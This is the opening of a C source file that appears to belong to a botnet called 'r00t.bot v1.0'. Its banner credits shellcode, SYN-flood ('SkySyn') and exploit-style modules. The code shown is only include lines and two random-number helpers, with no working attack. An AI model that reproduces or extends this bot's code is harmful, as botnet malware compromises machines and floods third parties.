/*

        _______  _______   __    ___.           __   
_______ \   _  \ \   _  \_/  |_  \_ |__   _____/  |_ 
\_  __ \/  /_\  \/  /_\  \   __\  | __ \ /  _ \   __\
 |  | \/\  \_/   \  \_/   \  |    | \_\ (  <_> )  |  
 |__|    \_____  /\_____  /__|   /\___  /\____/|__|  
               \/ Affix \/       \/   \/ iHack.co.uk
			   
				 r00t.bot v1.0
				 ASN - Affix
				 SkySyn - Affix
				 Connection(recode) - Affix
				 Shellcode - h1dd3n
				 ftpd - Affix

*/

#include "includes.h"
#include "functions.h"

#include "externs.h"

int brandom(int bot,int top) { return (int)((float)(top-bot)*rand()/(RAND_MAX+1.0))+bot; }
int get_random_number(int range) { return rand()%range; }
